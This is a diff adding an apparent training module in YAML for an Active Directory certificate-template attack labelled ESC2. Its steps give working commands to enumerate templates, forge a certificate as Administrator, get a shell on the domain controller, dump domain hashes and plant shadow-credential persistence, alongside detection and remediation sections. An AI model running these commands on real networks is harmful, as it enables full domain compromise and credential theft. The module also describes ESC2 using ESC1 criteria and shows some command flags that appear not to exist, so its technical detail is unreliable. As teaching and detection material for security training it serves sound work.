@@ -1,0 +1,173 @@
+# Category: Active Directory Security - AD CS Attacks
+name: "AD CS ESC2 — Privileged Certificate Template Exploitation"
+id: "ad-adcs-esc2-001"
+category: "offensive_security"
+subcategory: "active_directory"
+difficulty: "advanced"
+estimated_time: "75 minutes"
+
+description: |
+  Exploit ESC2 vulnerability where certificate templates allow enrollment with
+  arbitrary Subject Alternative Names (SANs) AND have Manager Approval disabled,
+  enabling impersonation of any domain principal. Focus on templates with
+  CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT + Client Authentication EKU.
+
+learning_objectives:
+  - Differentiate ESC1 vs ESC2 certificate template misconfigurations
+  - Enumerate templates with CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag
+  - Exploit ESC2 to obtain certificates for privileged accounts
+  - Understand PKINIT authentication and certificate-based persistence
+
+tools:
+  - certipy
+  - certify
+  - rubeus
+  - impacket
+  - openssl
+  - bloodhound
+
+prerequisites:
+  - Valid domain credentials with enrollment rights on vulnerable template
+  - Network access to AD CS (TCP 443/80 for HTTP enrollment or TCP 135 for RPC)
+  - Understanding of PKI certificate templates and EKU extensions
+  - Authorization for certificate abuse testing
+
+steps:
+  - id: step1
+    phase: "reconnaissance"
+    action: "Enumerate AD CS templates for ESC2 candidates"
+    commands:
+      - "# Certipy: Find vulnerable templates with ESC2 flag"
+      - "certipy find -u '[username]@[domain]' -p '[password]' -dc-ip [dc_ip] -vulnerable -stdout 2>&1 | grep -A30 'ESC2'"
+      - "# Certify: Enumerate templates with detailed flags"
+      - "Certify.exe find /vulnerable /currentuser"
+      - "# Manual LDAP query for ESC2 criteria"
+      - "ldapsearch -H ldap://[dc_ip] -x -D '[username]@[domain]' -w '[password]' -b 'CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=[dc1],DC=[dc2]' '(&(objectClass=pKICertificateTemplate)(msPKI-Certificate-Name-Flag=1)(msPKI-Enrollment-Flag=0))' cn msPKI-Application-Cert-Policy msPKI-Enrollment-Flag"
+    expected_output: "List of certificate templates with ESC2 vulnerability (ENROLLEE_SUPPLIES_SUBJECT + no Manager Approval)"
+    detection: "LDAP queries against Certificate Templates container; certipy/Certify tool execution signatures"
+
+  - id: step2
+    phase: "enumeration"
+    action: "Verify enrollment rights and template permissions"
+    commands:
+      - "# Check ACLs on vulnerable template with Certipy"
+      - "certipy find -u '[username]@[domain]' -p '[password]' -dc-ip [dc_ip] -acl -stdout | grep -A10 '[vulnerable_template]'"
+      - "# PowerView: Check enrollment permissions"
+      - "Get-DomainObjectAcl -Identity '[vulnerable_template]' -Domain [domain] -Server [dc_ip] | Where-Object {$_.ActiveDirectoryRights -match 'Enroll' -or $_.ActiveDirectoryRights -match 'ExtendedRight'}"
+      - "# Verify EKU: Must include Client Authentication (1.3.6.1.5.5.7.3.2)"
+      - "ldapsearch -H ldap://[dc_ip] -x -D '[username]@[domain]' -w '[password]' -b 'CN=[vulnerable_template],CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=[dc1],DC=[dc2]' '(objectClass=*)' msPKI-Enrollment-Flag msPKI-Certificate-Application-Policy"
+    expected_output: "Confirmation that low-privilege user has Enroll rights; template has Client Authentication EKU"
+    compliance_mapping: ["MITRE ATT&CK T1649", "NIST 800-53 IA-5"]
+
+  - id: step3
+    phase: "exploitation"
+    action: "Request ESC2 certificate impersonating Domain Admin"
+    commands:
+      - "# Certipy: Request certificate with arbitrary UPN SAN"
+      - "certipy req -u '[username]@[domain]' -p '[password]' -dc-ip [dc_ip] -target '[ca_server]' -ca '[ca_name]' -template '[vulnerable_template]' -upn 'Administrator@[domain]' -debug"
+      - "# Save the .pfx certificate"
+      - "ls -la administrator_esc2.pfx"
+      - "# Alternative: Use Certify from Windows"
+      - "Certify.exe request /ca:'[ca_server]\\[ca_name]' /template:'[vulnerable_template]' /altname:'Administrator@[domain]' /export"
+    expected_output: "Certificate file (.pfx) containing forged identity for Administrator@domain"
+    detection: "Event ID 4886/4887 in CA logs: Certificate requested/issued with UPN SAN of privileged account"
+
+  - id: step4
+    phase: "exploitation"
+    action: "Authenticate using forged certificate via PKINIT"
+    commands:
+      - "# Certipy: Authenticate and obtain TGT + NTLM hash"
+      - "certipy auth -pfx administrator_esc2.pfx -dc-ip [dc_ip] -username Administrator -domain [domain]"
+      - "# Output includes: TGT (.ccache) and NTLM hash for pass-the-hash"
+      - "export KRB5CCNAME=Administrator.ccache"
+      - "# Use TGT for lateral movement"
+      - "impacket-psexec -k -no-pass '[domain]/Administrator@[dc_ip]'"
+      - "# Or use recovered NTLM hash"
+      - "impacket-secretsdump -hashes ':[admin_ntlm_hash]' '[domain]/Administrator@[dc_ip]' -just-dc-ntlm"
+    expected_output: "Interactive shell on domain controller or extracted domain hashes"
+    risk_level: "critical"
+    compliance_mapping: ["SOC 2 CC6.1", "PCI DSS v4.0-8.3.2"]
+
+  - id: step5
+    phase: "post_exploitation"
+    action: "Establish certificate-based persistence via shadow credentials"
+    commands:
+      - "# Add shadow credential to Domain Admin account"
+      - "certipy shadow auto -u '[username]@[domain]' -p '[password]' -account Administrator -dc-ip [dc_ip] -template '[vulnerable_template]'"
+      - "# Verify msDS-KeyCredentialLink attribute was added"
+      - "certipy shadow list -u '[username]@[domain]' -p '[password]' -account Administrator -dc-ip [dc_ip]"
+      - "# Authenticate later using shadow credential (no password needed)"
+      - "certipy auth -pfx administrator_esc2.pfx -dc-ip [dc_ip] -username Administrator -domain [domain] -shadow"
+    expected_output: "Persistent access to Domain Admin account via msDS-KeyCredentialLink"
+    detection: "Event ID 5136: Directory object modified (msDS-KeyCredentialLink attribute change)"
+
+detection:
+  network_indicators:
+    - "HTTP/HTTPS enrollment requests to CA with arbitrary SAN values"
+    - "PKINIT Kerberos authentication (TGT request with certificate) from non-admin systems"
+    - "High volume of certificate requests for privileged UPNs from low-privilege accounts"
+  log_indicators:
+    - "Event ID 4886 (CA): Certificate requested with Subject Alternative Name of privileged account"
+    - "Event ID 4887 (CA): Certificate issued for privileged SAN"
+    - "Event ID 4768: Kerberos TGT requested via PKINIT (certificate authentication)"
+    - "Event ID 5136: msDS-KeyCredentialLink attribute modification on privileged object"
+    - "Defender for Identity: Alert on suspicious certificate enrollment patterns"
+  endpoint_indicators:
+    - "Certipy.exe, Certify.exe, or Rubeus.exe execution with certificate-related flags"
+    - "New .pfx/.pem certificate files in user temp directories"
+    - "PowerShell history containing Get-DomainObjectAcl or LDAP certificate queries"
+
+remediation:
+  immediate:
+    - "Disable or remove enrollment rights on ESC2-vulnerable templates for non-privileged groups"
+    - "Enable Manager Approval on templates that require SAN flexibility"
+    - "Audit and rotate credentials for any accounts impersonated via ESC2"
+  long_term:
+    - "Deploy PSPKIAudit or Certipy in audit mode to continuously monitor AD CS configuration"
+    - "Implement certificate template versioning and change management workflows"
+    - "Enable CA logging and forward Event IDs 4886/4887 to SIEM with alerting"
+    - "Restrict Certificate Templates container ACLs to prevent unauthorized modifications"
+    - "Conduct quarterly AD CS security reviews as part of SOC 2 CC6.1 evidence"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1649"
+    description: "Steal or Forge Authentication Certificates"
+  - standard: "SOC 2 Type II"
+    control: "CC6.1"
+    description: "Logical access controls protect against unauthorized authentication bypass"
+  - standard: "NIST 800-53 Rev. 5"
+    control: "IA-5"
+    description: "Authenticator management — certificate lifecycle and trust validation"
+  - standard: "PCI DSS v4.0"
+    control: "8.3.2"
+    description: "Strong cryptography for authentication; certificate-based auth must be properly configured"
+
+variables:
+  domain: "corp.example.com"
+  dc1: "corp"
+  dc2: "example"
+  dc_ip: "192.168.1.10"
+  username: "jsmith"
+  password: "Password123"
+  ca_server: "ca01.corp.example.com"
+  ca_name: "corp-CA01-CA"
+  vulnerable_template: "ESC2_Vulnerable_Template"
+  admin_ntlm_hash: "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+
+assessment_questions:
+  - "What is the key difference between ESC1 and ESC2 certificate template vulnerabilities?"
+  - "Why does ESC2 require Manager Approval to be disabled for exploitation?"
+  - "How does PKINIT authentication enable lateral movement after ESC2 exploitation?"
+  - "Which Event ID indicates a certificate was issued with a privileged SAN value?"
+  - "How do shadow credentials provide persistence that survives password resets?"
+
+references:
+  - url: "https://github.com/ly4k/Certipy"
+    title: "Certipy - AD CS Attack and Audit Tool"
+  - url: "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
+    title: "Certified Pre-Owned: AD CS Abuse Techniques - SpecterOps"
+  - url: "https://attack.mitre.org/techniques/T1649/"
+    title: "MITRE ATT&CK - Steal or Forge Authentication Certificates"
+  - url: "https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-templates"
+    title: "Active Directory Certificate Services Template Configuration"
